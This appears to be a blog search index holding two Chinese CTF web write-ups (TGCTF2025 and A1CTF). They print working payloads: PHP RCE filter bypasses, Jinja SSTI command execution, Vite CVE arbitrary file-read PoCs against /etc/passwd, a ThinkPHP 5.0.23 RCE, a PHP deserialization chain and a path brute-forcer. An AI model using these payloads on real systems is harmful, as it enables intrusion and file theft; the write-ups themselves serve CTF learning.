<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>TGCTF_Writeup</title>
      <link href="/2025/04/18/TGCTF-Writeup/"/>
      <url>/2025/04/18/TGCTF-Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="TGCTF2025"><a href="#TGCTF2025" class="headerlink" title="TGCTF2025"></a>TGCTF2025</h1><p>这比赛说他好吧，确实让我发现自己的知识点漏洞有多大(哈哈，还是过过的知识点，恨不得给自己一巴掌，差点就可以卷铺盖走人了)。说差，你吗的前端游戏我一直以为题目就是那个错误页面，第二天又开才发现是正常的前端游戏，构式靶机。。。还有一堆莫名其妙的脑洞和对电波环节，有点。。了吧</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="AAA偷渡阴平"><a href="#AAA偷渡阴平" class="headerlink" title="AAA偷渡阴平"></a><strong>AAA偷渡阴平</strong></h3><pre><code class="highlight php"> <span class="meta">&lt;?php</span><span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span>    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);&#125;<span class="keyword">else</span>&#123;    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);&#125;<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</code></pre><p>一眼无参RCE。。网上随便找个poc过了</p><pre><code class="highlight php">?tgctf2025=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;jiang=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);</code></pre><h3 id="火眼辩魑魅"><a href="#火眼辩魑魅" class="headerlink" title="火眼辩魑魅"></a><strong>火眼辩魑魅</strong></h3><p>robots.txt </p><pre><code class="highlight plaintext">User-Agent: *Disallow: tgupload.phpDisallow: tgshell.phpDisallow: tgxff.phpDisallow: tgser.phpDisallow: tgphp.phpDisallow: tginclude.phphttp://node1.tgctf.woooo.tech:32484/</code></pre><p>我是唇笔所以净喜欢走弯路哈哈。。</p><p>明明题面已经说要看哪个了</p><p>稍微尝试了一下发现system,passthru这些基本都被ban了</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250412143217444.png" alt="image-20250412143217444"></p><pre><code class="highlight plaintext">shell=echo `cat /tg*`;</code></pre><p>但是赛后看官方WP看红温了哈哈，官方给的是tgxff.php然后用ssti打，说是其他能打出来就是非预期哦，鉴定为史</p><p>同时上面这个shell其实直接连都可以。。。算是绕弯了</p><h3 id="AAA偷渡阴平-复仇"><a href="#AAA偷渡阴平-复仇" class="headerlink" title="AAA偷渡阴平(复仇)"></a><strong>AAA偷渡阴平(复仇)</strong></h3><p>ban了无参RCE，但是一样打</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span>    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);&#125;<span class="keyword">else</span>&#123;    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);&#125;<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</code></pre><p>poc:</p><pre><code class="highlight php">?tgctf2025=<span class="title function_ invoke__">session_start</span>();<span class="title function_ invoke__">passthru</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>()));PHPSESSID=<span class="number">636174202</span>f666c6167</code></pre><h3 id="直面天命"><a href="#直面天命" class="headerlink" title="直面天命"></a><strong>直面天命</strong></h3><p>先看一眼源码</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221047192.png" alt="image-20250413221047192"></p><p>换hint</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221120246.png" alt="image-20250413221120246"></p><p>。。懒得喷，我直接pt买hint了哈哈</p><p>这里贴一下队里师傅的脚本</p><pre><code class="highlight py"><span class="keyword">import</span> requests<span class="keyword">import</span> itertools<span class="keyword">import</span> string<span class="keyword">import</span> time<span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor<span class="comment"># 目标网站的基础URL - 使用前请替换为实际目标URL</span>BASE_URL = <span class="string">&quot;http://node2.tgctf.woooo.tech:32010/&quot;</span>  <span class="comment"># 请替换为实际目标URL</span><span class="comment"># 使用所有26个小写字母</span>all_letters = string.ascii_lowercase  <span class="comment"># &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><span class="comment"># 定义测试单个路径的函数</span><span class="keyword">def</span> <span class="title function_">test_path</span>(<span class="params">path</span>):    url = BASE_URL + path    <span class="keyword">try</span>:        response = requests.get(url, timeout=<span class="number">3</span>)        <span class="comment"># 根据状态码和响应长度来判断是否找到有效页面</span>        status = response.status_code        length = <span class="built_in">len</span>(response.text)        <span class="comment"># 记录所有非404响应</span>        <span class="keyword">if</span> status != <span class="number">404</span>:            <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现: <span class="subst">&#123;url&#125;</span> (状态码: <span class="subst">&#123;status&#125;</span>, 长度: <span class="subst">&#123;length&#125;</span>)&quot;</span>)            <span class="comment"># 保存发现的路径到文件中</span>            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;found_paths.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:                f.write(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span> (状态码: <span class="subst">&#123;status&#125;</span>, 长度: <span class="subst">&#123;length&#125;</span>)\n&quot;</span>)            <span class="comment"># 如果是200状态码，保存响应内容以便检查</span>            <span class="keyword">if</span> status == <span class="number">200</span>:                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;response_<span class="subst">&#123;path&#125;</span>.html&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:                    f.write(response.text)    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:        <span class="keyword">pass</span>  <span class="comment"># 忽略连接错误，继续测试</span>    <span class="keyword">return</span> path<span class="comment"># 显示开始信息</span><span class="built_in">print</span>(<span class="string">&quot;[*] 开始爆破所有4字母路径...&quot;</span>)<span class="built_in">print</span>(<span class="string">f&quot;[*] 目标URL: <span class="subst">&#123;BASE_URL&#125;</span>&quot;</span>)<span class="built_in">print</span>(<span class="string">f&quot;[*] 总组合数: <span class="subst">&#123;<span class="number">26</span>**<span class="number">4</span>&#125;</span> (这可能需要一些时间)&quot;</span>)<span class="comment"># 跟踪进度变量</span>total_combinations = <span class="number">26</span>**<span class="number">4</span>  <span class="comment"># 可能的4字母组合总数</span>completed = <span class="number">0</span>start_time = time.time()<span class="comment"># 使用多线程加速过程</span><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">20</span>) <span class="keyword">as</span> executor:    <span class="comment"># 生成并测试所有4字母组合</span>    <span class="keyword">for</span> combo <span class="keyword">in</span> itertools.product(all_letters, repeat=<span class="number">4</span>):        path = <span class="string">&#x27;&#x27;</span>.join(combo)        executor.submit(test_path, path)        <span class="comment"># 定期更新进度</span>        completed += <span class="number">1</span>        <span class="keyword">if</span> completed % <span class="number">5000</span> == <span class="number">0</span>:            elapsed = time.time() - start_time            percentage = (completed / total_combinations) * <span class="number">100</span>            rate = completed / elapsed <span class="keyword">if</span> elapsed &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>            remaining = (total_combinations - completed) / \                rate <span class="keyword">if</span> rate &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>            <span class="built_in">print</span>(<span class="string">f&quot;[*] 进度: <span class="subst">&#123;completed&#125;</span>/<span class="subst">&#123;total_combinations&#125;</span> (<span class="subst">&#123;percentage:<span class="number">.2</span>f&#125;</span>%) - &quot;</span>                  <span class="string">f&quot;已用时间: <span class="subst">&#123;elapsed:<span class="number">.1</span>f&#125;</span>秒 - 预计剩余: <span class="subst">&#123;remaining:<span class="number">.1</span>f&#125;</span>秒 - 速度: <span class="subst">&#123;rate:<span class="number">.1</span>f&#125;</span>请求/秒&quot;</span>)<span class="built_in">print</span>(<span class="string">&quot;[*] 爆破完成! 查看 &#x27;found_paths.txt&#x27; 获取结果。&quot;</span>)</code></pre><p><code>/aazz</code></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221221814.png" alt="image-20250413221221814"></p><p>…参…数……?那我问你，参数名是什么，那我问你(也有可能是我没进群所以没看到类似通知的缘故)</p><p>反正后面知道是filename(赛后知道这个也是要fuzz出来的),看名字应该就是任意文件读取了</p><p>稍微试一下啊</p><p>预期应该是抓源码的，结果哈哈</p><pre><code class="highlight plaintext">aazz?filename=../../flag</code></pre><p>贴一个源码吧</p><pre><code class="highlight python"><span class="keyword">import</span> os<span class="keyword">import</span> string<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory<span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_keyapp = Flask(__name__)black_list=[<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>]<span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():            <span class="keyword">return</span> <span class="literal">True</span>    <span class="keyword">return</span> <span class="literal">False</span><span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):    <span class="comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span>    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span><span class="keyword">def</span> <span class="title function_">home</span>():    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="keyword">def</span> <span class="title function_">greet</span>():    template1=<span class="string">&quot;&quot;</span>    template2=<span class="string">&quot;&quot;</span>    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>    <span class="keyword">if</span> waf(name):        template = <span class="string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹</span></code></pre><h3 id="直面天命（复仇）"><a href="#直面天命（复仇）" class="headerlink" title="直面天命（复仇）"></a><strong>直面天命（复仇）</strong></h3><pre><code class="highlight python"><span class="keyword">import</span> os<span class="keyword">import</span> string<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory<span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_keyapp = Flask(__name__)black_list=[<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&#x27;pop&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;_.&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;application&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;arg&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]<span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():            <span class="keyword">return</span> <span class="literal">True</span>    <span class="keyword">return</span> <span class="literal">False</span><span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):    <span class="comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span>    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span><span class="keyword">def</span> <span class="title function_">home</span>():    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="keyword">def</span> <span class="title function_">greet</span>():    template1=<span class="string">&quot;&quot;</span>    template2=<span class="string">&quot;&quot;</span>    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>    <span class="keyword">if</span> waf(name):        template = <span class="string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹</span><span class="string">Image&#x27;</span>    <span class="keyword">else</span>:        k=<span class="number">0</span>        <span class="keyword">for</span> i <span class="keyword">in</span> name:            <span class="keyword">if</span> is_typable(i):                <span class="keyword">continue</span>            k=<span class="number">1</span>            <span class="keyword">break</span>        <span class="keyword">if</span> k==<span class="number">1</span>:            <span class="keyword">if</span> <span class="keyword">not</span> (secret_key[:<span class="number">2</span>] <span class="keyword">in</span> name <span class="keyword">and</span> secret_key[<span class="number">2</span>:]):                template = <span class="string">&#x27;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧</span><span class="string"></span><span class="string">再去西行历练历练</span><span class="string"></span><span class="string">Image&#x27;</span>                <span class="keyword">return</span> render_template_string(template)            template1 = <span class="string">&quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”</span><span class="string">最后，如果你用了cat，就可以见到齐天大圣了</span><span class="string">&quot;</span>            template= template.replace(<span class="string">&quot;天命&quot;</span>,<span class="string">&quot;&#123;&#123;&quot;</span>).replace(<span class="string">&quot;难违&quot;</span>,<span class="string">&quot;&#125;&#125;&quot;</span>)            template = template    <span class="keyword">if</span> <span class="string">&quot;cat&quot;</span> <span class="keyword">in</span> template:        template2 = <span class="string">&#x27;</span><span class="string">或许你这只叫天命人的猴子，真的能做到？</span><span class="string"></span><span class="string">Image&#x27;</span>    <span class="keyword">try</span>:        <span class="keyword">return</span> template1+render_template_string(template)+render_template_string(template2)    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:        error_message = <span class="string">f&quot;500报错了，查询语句如下：</span><span class="string"><span class="subst">&#123;template&#125;</span>&quot;</span>        <span class="keyword">return</span> error_message, <span class="number">400</span><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span><span class="keyword">def</span> <span class="title function_">hinter</span>():    template=<span class="string">&quot;hint：</span><span class="string">有一个aazz路由，去那里看看吧，天命人!&quot;</span>    <span class="keyword">return</span> render_template_string(template)<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/aazz&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span><span class="keyword">def</span> <span class="title function_">finder</span>():    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:        source_code = f.read()    <span class="keyword">return</span> <span class="string">f&quot;</span><span class="string"><span class="subst">&#123;source_code&#125;</span></span><span class="string">&quot;</span>, <span class="number">200</span>, &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413215533251.png" alt="image-20250413215533251"></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413215326433.png" alt="image-20250413215326433"></p><p>最终paylaod</p><pre><code class="highlight plaintext">name=天命()[&#x27;\x5f\x5fclass\x5f\x5f&#x27;][&#x27;\x5f\x5fmro\x5f\x5f&#x27;][-1][&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;]()[351](&#x27;cat ntgffff11111aaaagggggggg&#x27;,shell=True,stdout=-1).communicate()[0].strip()难违</code></pre><p>看队里师傅wp这题是能用fenjing的，有点难绷哈哈</p><h3 id="前端游戏-复现"><a href="#前端游戏-复现" class="headerlink" title="前端游戏(复现)"></a>前端游戏(复现)</h3><p><code>CVE-2025-30208</code></p><pre><code class="highlight plaintext">/@fs/tgflagggg?import&amp;raw??/@fs/tgflagggg?raw??</code></pre><h3 id="前端游戏Plus-复现"><a href="#前端游戏Plus-复现" class="headerlink" title="前端游戏Plus (复现)"></a>前端游戏Plus (复现)</h3><p><code>CVE-2025-31486</code>的复现</p><p>是一个任意文件读的漏洞</p><p>先贴出poc</p><pre><code class="highlight plaintext">/tgflagggg?.svg?.wasm?init</code></pre><p>打完之后还尝试了一下打穿一下root</p><pre><code class="highlight plaintext">/etc/passwd?.svg?.wasm?init</code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250415135336099.png" alt="image-20250415135336099"></p><p>看了一眼原CVE下的另一个poc</p><pre><code class="highlight plaintext">curl &#x27;http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw&#x27;#https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</code></pre><p>这个是打不穿的,因为前面目录的名字未知，不好打，贴一下官方WP的POC</p><pre><code class="highlight plaintext">@fs/app/?/../../../../../tgflagggg?import&amp;?raw</code></pre><h3 id="前端游戏Ultra-复现"><a href="#前端游戏Ultra-复现" class="headerlink" title="前端游戏Ultra(复现)"></a>前端游戏Ultra(复现)</h3><p>这三个前端的CVE都挺新的</p><p><code>CVE-2025-32395</code></p><p>先贴原漏洞的poc</p><pre><code class="highlight plaintext">curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173#https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4</code></pre><p>这个就是真要猜测路径了哈哈(</p><p>幸好给了源码</p><p>复现的时候哈基bar应激了，换了bp打<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250415141634705.png" alt="image-20250415141634705"></p><p>不知道为什么官方poc给的是四个套，虽然不影响结果，但是先质疑再质疑哈</p><p>顺带看到了另一个相关的CVE，也学习一下算了</p><p><code>CVE-2025-31125</code></p><p>这个洞是利用inline的规则配合.wsam进行绕过(是对第一个CVE的补丁的绕过)</p><pre><code class="highlight plaintext">/@fs/C://windows/win.ini?import&amp;inline=1.wasm?init</code></pre><p>这边引用一下大佬的解释好了</p><pre><code class="highlight plaintext">除了?url和?raw还有一种内联的方法?inline，他的作用是：将文件（如图片、字体、WASM 等）的内容转换为 Base64 编码字符串 或 直接嵌入到 JS/HTML/CSS 中，避免额外的 HTTP 请求?init主要用于 WebAssembly（.wasm）文件的初始化，默认只有.wasm支持?init其他如.data、.bin可以通过插件拓展支持通过这种新的方法绕过了修复后的正则过滤//原链接https://cloud.tencent.com/developer/article/2513407</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> -WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A1CTF_Writeup</title>
      <link href="/2025/04/18/A1CTF-Writeup/"/>
      <url>/2025/04/18/A1CTF-Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="A1CTF-writeup"><a href="#A1CTF-writeup" class="headerlink" title="A1CTF writeup"></a>A1CTF writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="真签到"><a href="#真签到" class="headerlink" title="真签到"></a>真签到</h3><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406164303646.png" alt="image-20250406164303646"></p><p>分析源码，大概是post一个弱比较过了后include传的flag</p><p>这边数组绕过+一个盲打</p><pre><code class="highlight plaintext">a[]=1&amp;b[]=2&amp;flag=/flag</code></pre><p>拿到flag</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406164513706.png" alt="image-20250406164513706"></p><h3 id="少女乐队时代"><a href="#少女乐队时代" class="headerlink" title="少女乐队时代"></a>少女乐队时代</h3><p>主页面没给提示</p><p>尝试用dirsearch扫一下</p><p>扫到备份文件<a href="http://www.zip/">www.zip</a></p><p>接着解压得到<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406164642808.png" alt="image-20250406164642808"></p><p>初步分析第一个php，是一个反序列化，构链</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">MyGO</span></span>&#123;    <span class="keyword">public</span> <span class="variable">$MyGO</span>;    <span class="keyword">public</span> <span class="variable">$Mujica</span>;    <span class="keyword">public</span> <span class="variable">$CRYCHIC</span>;    <span class="comment">/*public function __call($name, $arguments)</span><span class="comment">    &#123;</span><span class="comment">       call_user_func($arguments[0]);//哦，好像不能rce</span><span class="comment">    &#125;*/</span>&#125;<span class="class"><span class="keyword">class</span> <span class="title">Mujica</span></span>&#123;    <span class="keyword">public</span> <span class="variable">$MyGO</span>;    <span class="keyword">public</span> <span class="variable">$Mujica</span>;    <span class="keyword">public</span> <span class="variable">$CRYCHIC</span>;<span class="comment">/*public static function __callStatic($name, $arguments)</span><span class="comment">    &#123;</span><span class="comment">        readfile(&#x27;/flag&#x27;);</span><span class="comment">    &#125;*/</span>&#125;<span class="class"><span class="keyword">class</span> <span class="title">CRYCHIC</span></span>&#123;    <span class="keyword">public</span> <span class="variable">$MyGO</span>;    <span class="keyword">public</span> <span class="variable">$Mujica</span>;    <span class="keyword">public</span> <span class="variable">$CRYCHIC</span>;<span class="comment">/*public function __toString()</span><span class="comment">    &#123;</span><span class="comment">        return $this-&gt;MyGO-&gt;Mujica($this-&gt;CRYCHIC);</span><span class="comment">    &#125;</span><span class="comment">*/</span>&#125;<span class="variable">$cr</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CRYCHIC</span>();<span class="comment">//触发ToString</span><span class="variable">$cr</span>-&gt;MyGO = <span class="keyword">new</span> <span class="title function_ invoke__">MyGO</span>();<span class="comment">//触发Call</span><span class="variable">$cr</span>-&gt;CRYCHIC = [<span class="string">&#x27;Mujica&#x27;</span>, <span class="string">&#x27;readflag&#x27;</span>]; <span class="comment">// 触发__callStatic</span><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$cr</span>);<span class="meta">?&gt;</span></code></pre><h3 id="留言框-尖尖的"><a href="#留言框-尖尖的" class="headerlink" title="留言框[尖尖的]"></a>留言框[尖尖的]</h3><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406164854971.png" alt="image-20250406164854971"></p><p>根据hint2是一个sqlite,并且根据hint5</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406165135796.png" alt="image-20250406165135796"></p><p>尝试注入:</p><pre><code class="highlight sqlite">1 union select 1--+</code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406165236875.png" alt="image-20250406165236875"></p><p>到这里就没什么思路了，又因为不能正经注入来命令执行</p><p>试试SSTI</p><p>发现回显</p><pre><code class="highlight plaintext">1 union select &#x27;&#123;&#123;7*7&#125;&#125;&#x27;</code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406165529894.png" alt="image-20250406165529894"></p><p>确定是SSTI注入，并且用正常的子类大不回显subclass下的列表，试试用config打</p><p>最终payload:</p><p><code>1+union+select+&#39;&#123;&#123;config.__class__.__init__.__globals__["os"].popen("cat+/flag").read()&#125;&#125;&#39;</code></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406165635952.png" alt="image-20250406165635952"></p><h3 id="你渴望权力吗？"><a href="#你渴望权力吗？" class="headerlink" title="你渴望权力吗？"></a>你渴望权力吗？</h3><p>ThiinkPHP5.0.23的版本漏洞(RCE)</p><p>直接对着复现</p><pre><code class="highlight plaintext">index.php/?s=captcha_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</code></pre><p>正确回显id</p><p>接着在id的位置注入php代码</p><pre><code class="highlight plaintext">echo &quot;&lt;?php phpinfo();?&gt;&quot; &gt; /var/www/public/test.php在id的位置ls 一下发现存在并且cat后代码没有被过滤那么直接打开test.php</code></pre><p>最终发现flag</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406170618103.png" alt="image-20250406170618103"></p><h3 id="哈里路大旋风"><a href="#哈里路大旋风" class="headerlink" title="哈里路大旋风"></a>哈里路大旋风</h3><p>根据页面提示，存在一个源码泄露</p><p>用dirsearch递归扫一下</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250407124218435.png" alt="image-20250407124218435"></p><p>发现网页源码</p><pre><code class="highlight python"><span class="keyword">import</span> base64<span class="keyword">import</span> os<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect,render_template_string,jsonifyapp = Flask(__name__, static_folder=<span class="string">&#x27;static&#x27;</span>)<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span><span class="keyword">def</span> <span class="title function_">home</span>():    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/eeval&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="keyword">def</span> <span class="title function_">eeval</span>():    <span class="keyword">if</span> request.form.get(<span class="string">&#x27;code&#x27;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:        code = request.form.get(<span class="string">&#x27;code&#x27;</span>)        evalcode = base64.b64decode(code).decode()        waf=<span class="string">&#x27;&#x27;&#x27;</span><span class="string">import sys</span><span class="string">import os</span><span class="string">import math</span><span class="string"></span><span class="string">def audit_checker(event,args):</span><span class="string">    if not event in [&quot;builtins.input&quot;,&quot;builtins.input/result&quot;]:</span><span class="string">        raise Exception(&quot;waf&quot;)</span><span class="string">sys.addaudithook(audit_checker)</span><span class="string"></span><span class="string">&#x27;&#x27;&#x27;</span>        evalcode=waf+<span class="built_in">str</span>(evalcode)        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/test.py&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:            f.write(evalcode)        <span class="keyword">try</span>:            status_code = os.system(<span class="string">&quot;python /tmp/test.py &gt; /tmp/output&quot;</span>)        <span class="keyword">except</span> Exception:            <span class="keyword">return</span> <span class="string">&quot;runtime error!!!&quot;</span>,<span class="number">500</span>        <span class="keyword">if</span> status_code == <span class="number">0</span>:            <span 